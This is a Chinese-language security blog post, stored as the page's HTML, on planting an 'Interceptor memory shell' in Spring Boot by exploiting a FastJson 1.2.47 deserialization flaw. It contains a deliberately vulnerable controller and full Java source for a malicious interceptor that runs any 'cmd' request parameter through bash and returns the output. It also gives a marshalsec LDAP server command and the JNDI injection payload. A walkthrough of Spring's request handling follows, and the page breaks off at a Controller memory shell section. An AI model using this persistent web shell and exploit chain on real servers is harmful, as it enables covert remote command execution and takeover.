@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="Interceptor Memory Shell实例JDK 1.8.0_20，采用FastJson 1.2.47的RCE来创造反序列化漏洞利用点 创建springboot项目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring Memory Shell">
+<meta property="og:url" content="https://jlkl.github.io/2022/05/26/Java-09/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="Interceptor Memory Shell实例JDK 1.8.0_20，采用FastJson 1.2.47的RCE来创造反序列化漏洞利用点 创建springboot项目">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/9kJm5LG_ftZ8GMt5iJHY4At-xMh3DIlyi5d5EIiNJ80.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/w05zwFRKb-uhnyZtGu0hzixUOcp1TYdzkxI2OIhzWRM.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/ZLQbvG97FOjPHtOHi15d1JCMD9drSe1OaXnJ8gS0RcI.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/K2x7P9So64z1KQ3FtfVwCR71Ts2wJI_2e6RvUPTwt68.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/kXtQmOEeVyS5J3_kJHS6-oL9HxBVwVhoCXAvbAuK_sI.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/iXkDIAR3imj-QXDtT_4hhKfuaNSwHjM791AGBXt_SBM.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/d74pNKukY1FyNVJu8IEBRuI2nDcEjtJ1yuNQeWNVcGQ.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/alNQYIM706n0lDkpneZSfDofB_242dnF4b5M4dSIs6U.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/L9JR0dtTBo5rkIEMxTEpeQmcghK6S6Z67bxtIGOPIhs.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/KIY5zLCYJ9q9v87IeJ0h8GMAsvBQBQ84qpSCKkuOBw8.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/Ty_uB05sZUReYCP3by5HcJdnutlAx2FlJR2upph8oxA.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/WA-OaE9WFvRrDNFbRiCEOQF3GegzluUFpGRMNuoqG3I.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/YtoyZNq30d8gRVwD0DpKL3oHS_ZGhMHyxtBu3TWXWLg.png">
+<meta property="og:image" content="https://jlkl.github.io/2022/05/26/Java-09/8ewg8SkImNvfIpp5FNCtBkhk1hYVNAKSdPjrJ23A3u8.png">
+<meta property="article:published_time" content="2022-05-26T01:41:12.000Z">
+<meta property="article:modified_time" content="2022-05-26T01:48:21.018Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlkl.github.io/2022/05/26/Java-09/9kJm5LG_ftZ8GMt5iJHY4At-xMh3DIlyi5d5EIiNJ80.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2022/05/26/Java-09/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Spring Memory Shell | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">44</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2022/05/26/Java-09/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Spring Memory Shell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-05-26 09:41:12 / Modified: 09:48:21" itemprop="dateCreated datePublished" datetime="2022-05-26T09:41:12+08:00">2022-05-26</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2022/05/26/Java-09/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/26/Java-09/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>15k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>19 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Interceptor-Memory-Shell"><a href="#Interceptor-Memory-Shell" class="headerlink" title="Interceptor Memory Shell"></a>Interceptor Memory Shell</h2><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>JDK 1.8.0_20，采用FastJson 1.2.47的RCE来创造反序列化漏洞利用点</p>
+<p>创建springboot项目</p>
+<p><img src="/2022/05/26/Java-09/9kJm5LG_ftZ8GMt5iJHY4At-xMh3DIlyi5d5EIiNJ80.png" alt="image"></p>
+<a id="more"></a>
+
+<p>这里先用2.5.13老版本springboot举例，勾选web</p>
+<p><img src="/2022/05/26/Java-09/w05zwFRKb-uhnyZtGu0hzixUOcp1TYdzkxI2OIhzWRM.png" alt="image"></p>
+<p>pom.xml，添加fastjson依赖</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.47&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>创建存在漏洞的controller</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">vuln</span><span class="params">(@RequestParam String content)</span> </span>&#123;</span><br><span class="line">        JSON.parse(content);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package bitterz.interceptors;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InjectToInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InjectToInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line"><span class="comment">//        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);</span></span><br><span class="line"><span class="comment">//        System.out.println("get context success");</span></span><br><span class="line"><span class="comment">//        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");</span></span><br><span class="line"><span class="comment">//        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");</span></span><br><span class="line"><span class="comment">//        field.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        System.out.println("get field success");</span></span><br><span class="line"><span class="comment">//        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span></span><br><span class="line">        <span class="comment">//获得context</span></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//获取 adaptedInterceptors 属性值</span></span><br><span class="line">        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">"requestMappingHandlerMapping"</span>);</span><br><span class="line">        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class="line">        <span class="comment">// 避免重复添加</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = adaptedInterceptors.size() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adaptedInterceptors.get(i) <span class="keyword">instanceof</span> InjectToInterceptor) &#123;</span><br><span class="line">                System.out.println(<span class="string">"已经添加过TestInterceptor实例了"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InjectToInterceptor aaa = <span class="keyword">new</span> InjectToInterceptor(<span class="string">"aaa"</span>);  <span class="comment">// 避免进入实例创建的死循环</span></span><br><span class="line">        adaptedInterceptors.add(aaa);  <span class="comment">//  添加全局interceptor</span></span><br><span class="line">        System.out.println(<span class="string">"添加成功"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InjectToInterceptor</span><span class="params">(String aaa)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String code = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span> (code != <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(code);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,request.getParameter(<span class="string">"cmd"</span>)).start();</span><br><span class="line">            <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            writer.write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">            writer.flush();</span><br><span class="line">            writer.close();</span><br><span class="line">            process.destroy();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            response.sendError(404);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动恶意LDAP服务，在8090开启web服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8090/#InjectToInterceptor</span></span><br></pre></td></tr></table></figure>
+
+<p>直接向vuln路由打fastjson payload，注入Interceptor内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content=&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"ldap://127.0.0.1:1389/#InjectToInterceptor"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入成功</p>
+<p><img src="/2022/05/26/Java-09/ZLQbvG97FOjPHtOHi15d1JCMD9drSe1OaXnJ8gS0RcI.png" alt="image"></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在任意controller下断点分析springboot的处理流程可以看到这里和tomcat的处理流程很像</p>
+<p><img src="/2022/05/26/Java-09/K2x7P9So64z1KQ3FtfVwCR71Ts2wJI_2e6RvUPTwt68.png" alt="image"></p>
+<p>在经过 Filter 层面处理后，就会进入熟悉的 <code>spring-webmvc</code> 组件 <code>org.springframework.web.servlet.DispatcherServlet</code> 类的 <code>doDispatch</code> 方法中</p>
+<p><img src="/2022/05/26/Java-09/kXtQmOEeVyS5J3_kJHS6-oL9HxBVwVhoCXAvbAuK_sI.png" alt="image"></p>
+<p>调用getHandler方法，跟进，可以看到是遍历<code>this.handlerMappings</code> 这个迭代器中的<code>mapper</code>的<code>getHandler</code> 方法处理Http中的request请求</p>
+<p><img src="/2022/05/26/Java-09/iXkDIAR3imj-QXDtT_4hhKfuaNSwHjM791AGBXt_SBM.png" alt="image"></p>
+<p>继续追踪，最终会调用到<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类的 <code>getHandler</code> 方法，并通过 <code>getHandlerExecutionChain(handler, request)</code> 方法返回 <code>HandlerExecutionChain</code> 类的实例</p>
+<p><img src="/2022/05/26/Java-09/d74pNKukY1FyNVJu8IEBRuI2nDcEjtJ1yuNQeWNVcGQ.png" alt="image"></p>
+<p>继续跟进<code>getHandlerExecutionChain</code> 方法，会遍历 <code>this.adaptedInterceptors</code> 对象里所有的 <code>HandlerInterceptor</code> 类实例，通过 <code>chain.addInterceptor</code> 把已有的所有拦截器加入到需要返回的 <code>HandlerExecutionChain</code> 类实例中</p>
+<p><img src="/2022/05/26/Java-09/alNQYIM706n0lDkpneZSfDofB_242dnF4b5M4dSIs6U.png" alt="image"></p>
+<p>回到<code>org.springframework.web.servlet.DispatcherServlet</code> 类的 <code>doDispatch</code> 方法中，调用applyPreHandle方法</p>
+<p><img src="/2022/05/26/Java-09/L9JR0dtTBo5rkIEMxTEpeQmcghK6S6Z67bxtIGOPIhs.png" alt="image"></p>
+<p>这里<code>AbstractHandlerMapping</code> 类的applyPreHandle方法，会遍历拦截器，并执行其<code>preHandle</code>方法</p>
+<p><img src="/2022/05/26/Java-09/KIY5zLCYJ9q9v87IeJ0h8GMAsvBQBQ84qpSCKkuOBw8.png" alt="image"></p>
+<p>之后的话看整体逻辑，执行了handler之后才会执行到controller，即Interceptor在controller之前</p>
+<p><img src="/2022/05/26/Java-09/Ty_uB05sZUReYCP3by5HcJdnutlAx2FlJR2upph8oxA.png" alt="image"></p>
+<p>如果程序提前在调用的 <code>Controller</code> 上设置了 <code>Aspect</code>（切面），那么在正式调用 <code>Controller</code> 前实际上会先调用切面的代码，一定程度上也起到了 “拦截” 的效果</p>
+<p>那么总结一下，一个 request 发送到 spring 应用，大概会经过以下几个层面才会到达处理业务逻辑的 Controller 层：</p>
+<figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Aspect --&gt; Controller</span><br></pre></td></tr></table></figure>
+
+<p>由上面的分析，会遍历 <code>this.adaptedInterceptors</code> 对象里所有的 <code>HandlerInterceptor</code> 类实例，通过 <code>chain.addInterceptor</code> 把已有的所有拦截器加入到需要返回的 <code>HandlerExecutionChain</code> 类实例中</p>
+<p><code>HandlerInterceptor</code> 这个接口要求实现preHandle函数，<code>Interceptor</code> 最后的处理也是调用preHandle函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.springframework.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.lang.Nullable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以通过context.getBean(“org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping”)获取该对象，再反射获取其中的adaptedInterceptors属性，并添加恶意interceptor实例对象即可完成内存马的注入</p>
+<h2 id="Controller-Memory-Shell"><a href="#Controller-Memory-Shell" class="headerlink" title="Controller Memory Shell"></a>Controller Memory Shell</h2><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>创建恶意代码</p>
